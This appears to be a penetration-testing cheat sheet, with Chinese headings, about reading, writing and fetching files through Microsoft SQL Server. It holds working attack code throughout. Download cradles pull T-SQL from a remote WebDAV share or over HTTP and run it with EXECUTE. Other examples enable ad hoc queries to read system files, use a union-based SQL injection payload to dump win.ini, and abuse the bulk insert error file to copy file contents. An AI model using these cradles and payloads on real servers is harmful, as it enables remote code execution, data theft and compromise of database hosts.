## 读写文件

### BULK下载:
```sql
-- Bulk Insert - Download Cradle Example

-- Setup variables
Declare @cmd varchar(8000)

-- Create temp table
CREATE TABLE #file (content nvarchar(4000));

-- Read file into temp table - web server must support propfind
BULK INSERT #file FROM '\\share.GhostWolfLab.com@SSL\Path\to\file.txt';

-- Select contents of file
SELECT @cmd = content FROM #file

-- Display command
SELECT @cmd

-- Run command
EXECUTE(@cmd)

-- Drop the temp table
DROP TABLE #file
```

### OAP

1.
```sql
-- OLE Automation Procedure - Download Cradle Example
-- Does not require a table, but can't handle larger payloads

-- Note: This also works with unc paths \\ip\file.txt
-- Note: This also works with webdav paths \\ip@80\file.txt However, the target web server needs to support propfind.

-- Setup Variables
DECLARE @url varchar(300)
DECLARE @WinHTTP int
DECLARE @handle int
DECLARE @Command varchar(8000)

-- Set target url containting TSQL
SET @url = 'http://127.0.0.1/mycmd.txt'

-- Setup namespace
EXEC @handle=sp_OACreate 'WinHttp.WinHttpRequest.5.1',@WinHTTP OUT

-- Call the Open method to setup the HTTP request
EXEC @handle=sp_OAMethod @WinHTTP, 'Open',NULL,'GET',@url,'false'

-- Call the Send method to send the HTTP GET request
EXEC @handle=sp_OAMethod @WinHTTP,'Send'

-- Capture the HTTP response content
EXEC @handle=sp_OAGetProperty @WinHTTP,'ResponseText', @Command out

-- Destroy the object
EXEC @handle=sp_OADestroy @WinHTTP

-- Display command
SELECT @Command

-- Run command
EXECUTE (@Command)
```

2.
```sql
-- OLE Automation Procedure - Download Cradle Example - Option 2
-- Can handle larger payloads, but requires a table

-- Note: This also works with unc paths \\ip\file.txt
-- Note: This also works with webdav paths \\ip@80\file.txt However, the target web server needs to support propfind.

-- Setup Variables
DECLARE @url varchar(300)
DECLARE @WinHTTP int
DECLARE @Handle int
DECLARE @Command varchar(8000)

-- Set target url containting TSQL
SET @url = 'http://127.0.0.1/mycmd.txt'

-- Create temp table to store downloaded string
CREATE TABLE #text(html text NULL)

-- Setup namespace
EXEC @Handle=sp_OACreate 'WinHttp.WinHttpRequest.5.1',@WinHTTP OUT

-- Call open method to configure HTTP request
EXEC @Handle=sp_OAMethod @WinHTTP, 'Open',NULL,'GET',@url,'false'

-- Call Send method to send the HTTP request
EXEC @Handle=sp_OAMethod @WinHTTP,'Send'

-- Capture the HTTP response content
INSERT #text(html)
EXEC @Handle=sp_OAGetProperty @WinHTTP,'ResponseText'

-- Destroy the object
EXEC @Handle=sp_OADestroy @WinHTTP

-- Display the commad
SELECT @Command = html from #text
SELECT @Command

-- Run the command
EXECUTE (@Command)

-- Remove temp table
DROP TABLE #text
```

### 读取TEXT

```sql
-- Note: Requires the driver to be installed ahead of time.

-- Enable show advanced options
sp_configure 'show advanced options',1
reconfigure
go

-- Enable ad hoc queries
sp_configure 'ad hoc distributed queries',1
reconfigure
go

-- list available providers
EXEC sp_MSset_oledb_prop

-- Read a text file
SELECT * FROM OpenDataSource( 'Microsoft.ACE.OLEDB.12.0','Data Source="c:\temp";Extended properties="Text;hdr=no"')...file#txt

-- Note: This also works with unc paths \\ip\file.txt
-- Note: This also works with webdav paths \\ip@80\file.txt However, the target web server needs to support propfind.
```

### BULK读取文件

```sql
-1 union select null,(select x from OpenRowset(BULK 'C:\Windows\win.ini',SINGLE_CLOB) R(x)),null,null
```

### BULK插入

```sql
-- Option 1 - local file
-- Create temp table
CREATE TABLE #file (content nvarchar(4000));

-- Read file into temp table
BULK INSERT #file FROM 'c:\temp\file.txt';

-- Select contents of file
SELECT content FROM #file

-- Option 2 - file via unc path
-- Create temp table
CREATE TABLE #file (content nvarchar(4000));

-- Read file into temp table
BULK INSERT #file FROM '\\127.0.0.1\c$\temp\file.txt';

-- Select contents of file
SELECT content FROM #file

-- Drop temp table
DROP TABLE #file

-- Option 3 - file via webdav path
-- Create temp table
CREATE TABLE #file (content nvarchar(4000));

-- Read file into temp table
BULK INSERT #file FROM '\\sharepoint.acme.com@SSL\Path\to\file.txt';

-- Select contents of file
SELECT content FROM #file

-- Drop temp table
DROP TABLE #file
```

### 读取XLSX

```sql
-- Note: Requires the driver to be installed ahead of time.

-- Enable show advanced options
sp_configure 'show advanced options',1
reconfigure
go

-- Enable ad hoc queries
sp_configure 'ad hoc distributed queries',1
reconfigure
go

-- list available providers
EXEC sp_MSset_oledb_prop

-- Read text file
SELECT * FROM OPENDATASOURCE('Microsoft.ACE.OLEDB.12.0','Data Source=C:\windows\temp\Book1.xlsx;Extended Properties=Excel 8.0')...[Targets$]

-- Note: This also works with unc paths \\ip\file.txt
-- Note: This also works with webdav paths \\ip@80\file.txt However, the target web server needs to support propfind.
```

### OpenRowset

```sql
-- select the contents of a file using openrowset
-- note: ad-hoc queries have to be enabled
-- https://docs.microsoft.com/en-us/sql/t-sql/functions/openrowset-transact-sql

-- Enable show advanced options
sp_configure 'show advanced options',1
reconfigure
go

-- Enable ad hoc queries
sp_configure 'ad hoc distributed queries',1
reconfigure
go

-- Read text file
SELECT cast(BulkColumn as varchar(max)) as Document FROM OPENROWSET(BULK N'C:\windows\temp\blah.txt', SINGLE_BLOB) AS Document

-- Note: This also works with unc paths \\ip\file.txt
-- Note: This also works with webdav paths \\ip@80\file.txt However, the target web server needs to support propfind.
```

### OpenRowset读取TEXT文件

```sql
-- Note: Requires the driver to be installed ahead of time.
-- EXEC sp_MSset_oledb_prop N'Microsoft.ACE.OLEDB.12.0', N'AllowInProcess', 1  -- not required
-- EXEC sp_MSset_oledb_prop N'Microsoft.ACE.OLEDB.12.0', N'DynamicParameters', 1  -- not required
-- EXEC master..xp_regwrite 'HKEY_LOCAL_MACHINE','SOFTWARE\Microsoft\Jet\4.0\Engines','SandBoxMode','REG_DWORD',1; -- not required

-- list available providers
EXEC sp_MSset_oledb_prop -- get available providers

-- Enable show advanced options
sp_configure 'show advanced options',1
reconfigure
go

-- Enable ad hoc queries
sp_configure 'ad hoc distributed queries',1
reconfigure
go

-- Read text file
SELECT * FROM OPENROWSET('Microsoft.ACE.OLEDB.12.0','Text;Database=c:\temp\;HDR=Yes;FORMAT=text', 'SELECT * FROM [file.txt]')

-- Note: This also works with unc paths \\ip\file.txt
-- Note: This also works with webdav paths \\ip@80\file.txt However, the target web server needs to support propfind.
```

### OpenRowset读取XLSX文件

```sql

-- Requires the driver be installed ahead of time.

-- list available providers
EXEC sp_MSset_oledb_prop -- get available providers

-- Enable show advanced options
sp_configure 'show advanced options',1
reconfigure
go

-- Enable ad hoc queries
sp_configure 'ad hoc distributed queries',1
reconfigure
go

-- Read text file from disk
SELECT column1 FROM OPENROWSET('Microsoft.ACE.OLEDB.12.0', 'Excel 12.0;Database=C:\windows\temp\Book1.xlsx;', 'SELECT * FROM [Targets$]')

-- Read text file from unc path
SELECT column1 FROM OPENROWSET('Microsoft.ACE.OLEDB.12.0', 'Excel 12.0;Database=\\server\folder\Book1.xlsx;', 'SELECT * FROM [Targets$]')

-- Note: This also works with webdav paths \\ip@80\file.txt However, the target web server needs to support propfind.
```

### BULK写入文件

```sql
-- author: antti rantassari, 2017
-- Description: Copy file contents to another file via local, unc, or webdav path
-- summary = file contains varchar data, field is an int, throws casting error on read, set error output to file, tada!
-- requires sysadmin or bulk insert privs

create table #errortable (ignore int)

bulk insert #errortable
from '\\localhost\c$\windows\win.ini' -- or  'c:\windows\system32\win.ni' -- or \\hostanme@SSL\folder\file.ini'
with
(
fieldterminator=',',
rowterminator='\n',
errorfile='c:\windows\temp\thatjusthappend.txt'
)

drop table #errortable
```

### OpenRowSet写入TEXT文件

```sql

-- Note: Requires the driver to be installed ahead of time.

-- list available providers
EXEC sp_MSset_oledb_prop -- get available providers

-- Enable show advanced options
sp_configure 'show advanced options',1
reconfigure
go

-- Enable ad hoc queries
sp_configure 'ad hoc distributed queries',1
reconfigure
go
-- Write text file
INSERT INTO OPENROWSET('Microsoft.ACE.OLEDB.12.0','Text;Database=c:\temp\;HDR=Yes;FORMAT=text', 'SELECT * FROM [file.txt]')
SELECT @@version

-- Note: This also works with unc paths \\ip\file.txt
-- Note: This also works with webdav paths \\ip@80\file.txt However, the target web server needs to support propfind.
```
